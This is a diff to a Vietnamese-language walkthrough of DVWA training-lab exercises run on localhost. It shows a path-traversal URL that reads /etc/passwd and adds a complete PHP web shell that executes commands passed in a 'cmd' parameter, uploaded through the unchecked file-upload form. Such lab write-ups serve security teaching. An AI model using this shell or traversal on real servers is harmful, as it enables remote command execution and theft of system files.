@@ -41,13 +41,36 @@ http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file1.php
 http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file2.php
 http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file3.php
 ```  
-Duong dan **/?page=** se tro den 1 file tren server, vi vay ta co the thu truy cap toi cac file khac tren server (vi du /etc/passwd) bang cach the, **../** vao URL nhu sau:
+Duong dan **/?page=** se tro den 1 file tren server, vi vay ta co the thu truy cap toi cac file khac tren server (vi du /etc/passwd) bang cach them **../** vao URL nhu sau:
 ```
 http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
 ```  
 ![File Inclusion_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/File%20Inclusion_1.png)  
 ## 5. File Upload  
-
+Kiem tra chuc nang upload bang cach upload file shell.php:  
+**shell.php**  
+```
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+</html>
+```  
+![File Upload_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/File%20Upload_1.png)  
+Truy cap toi URL cua file shell.php:  
+![File Upload_2](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/File%20Upload_2.png)  
+Chuc nang File Upload khong thuc hien kiem tra file duoc upload len web co phai la file img khong, dan toi viec co the upload cac file khong hop le.  
 ## 6. Insecure Captcha  
 
 ## 7. SQL Injection  
